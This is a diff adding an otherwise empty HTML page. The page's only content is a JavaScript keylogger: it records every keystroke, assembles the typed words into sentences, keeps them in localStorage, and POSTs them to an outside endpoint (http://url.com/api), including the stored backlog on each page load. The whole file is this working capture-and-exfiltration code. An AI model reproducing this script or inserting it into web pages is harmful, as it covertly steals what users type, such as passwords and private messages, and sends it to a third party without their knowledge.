@@ -1,0 +1,67 @@
+<!doctype html>
+<html>
+  <head>
+  </head>
+  <body>
+    <script type="text/javascript">
+      const localStorageKey = "sentences";
+      let word = "";
+      let sentence = "";
+
+      window.onload = function() {
+        storedSentences = localStorage.getItem(localStorageKey);
+        if(storedSentences) {
+          sendToServer(storedSentences);
+        } else {
+          storedSentences = "";
+        }
+      }
+
+      document.addEventListener("keydown", function (pressedKey) {
+        var characterCode = pressedKey.which || pressedKey.keyCode;
+        var characterValue = String.fromCharCode(characterCode);
+
+        switch(characterCode) {
+          case 32:
+            printWord();
+            break;
+          case 13:
+          case 190:
+            printSentence();
+            break;
+          default:
+            word += characterValue;
+            break;
+        }
+      });
+
+      function printWord() {
+        if(sentence) {
+          sentence += " " + word;
+        } else {
+          sentence = word;
+        }
+        console.log(word);
+        word = ''
+      }
+
+      function printSentence() {
+        printWord();
+        console.log(sentence);
+        let storedSentences = localStorage.getItem(localStorageKey);
+        storedSentences += sentence + ". ";
+        localStorage.setItem(localStorageKey, storedSentences);
+        sendToServer(sentence);
+        sentence = "";
+      }
+
+      function sendToServer(content) {
+        var request = new XMLHttpRequest();
+        request.open("POST", "http://url.com/api");
+        request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+        request.send('content=' + content)
+        console.log('sent: ' + content);
+      }
+    </script>
+  </body>
+</html>
